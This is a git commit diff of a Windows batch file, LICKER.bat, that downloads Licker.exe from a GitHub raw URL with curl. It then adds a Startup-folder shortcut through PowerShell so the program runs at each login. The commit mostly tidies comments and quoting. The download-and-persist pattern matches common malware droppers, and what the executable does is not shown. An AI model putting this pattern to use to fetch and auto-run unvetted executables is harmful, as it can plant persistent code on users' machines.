b85f00d1407008d4bf1131dcdc5ad45fd8758f20
sankarideb1-hue <sankarideb1@gmail.com>
2026-04-26 15:39:07 +0530

    Update LICKER.bat

--- LICKER.bat
+++ LICKER.bat
@@ -1,20 +1,16 @@
 @echo off
-:: 1. Define paths
 set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
 set "SAVE_PATH=%USERPROFILE%\Licker.exe"
 set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"
 
 echo Downloading Licker...
-:: 2. Use curl to download the file to the user's profile folder
-curl -L %EXE_URL% -o "%SAVE_PATH%"
+curl -L "%EXE_URL%" -o "%SAVE_PATH%"
 
 if exist "%SAVE_PATH%" (
     echo Creating startup shortcut...
-    :: 3. Create a shortcut in the Startup folder using PowerShell
-    powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_LINK%');$s.TargetPath='%SAVE_PATH%';$s.Save()"
+    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LINK%'); $s.TargetPath = '%SAVE_PATH%'; $s.Save()"
     echo Setup complete! Licker will run at next login.
 ) else (
-    echo Download failed. Please check your internet connection.
+    echo Download failed. Check internet or if the link is correct.
 )
-
 pause
